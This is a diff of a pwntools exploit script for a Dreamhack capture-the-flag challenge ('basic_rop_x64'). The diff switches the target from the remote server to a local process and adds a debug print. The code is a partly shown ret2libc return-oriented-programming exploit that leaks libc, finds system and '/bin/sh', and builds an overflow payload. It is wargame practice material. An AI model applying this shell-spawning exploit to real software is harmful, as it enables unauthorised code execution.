@@ -1,10 +1,10 @@
 from pwn import *
 
 context.log_level = 'debug'
-#p = process("./dreamhack/basic_rop_x64/basic_rop_x64")
-p = remote("host3.dreamhack.games", 11273)
-libc = ELF("./dreamhack/basic_rop_x64/libc.so.6")
-e = ELF("./dreamhack/basic_rop_x64/basic_rop_x64")
+p = process("./basic_rop_x64")
+#p = remote("host3.dreamhack.games", 11273)
+libc = ELF("./libc.so.6")
+e = ELF("./basic_rop_x64")
 
 ret = 0x4005a9
 pop_rdi = 0x400883
@@ -29,6 +29,8 @@ puts = u64(p.recvn(6)+b"\x00"*2)
 libc_base = puts - libc.sym['puts']
 system = libc_base + libc.sym['system']
 sh = libc_base + list(libc.search(b'/bin/sh'))[0]
+
+print(hex(sh))
 
 payload = b"A"*0x48
 payload += p64(pop_rdi)
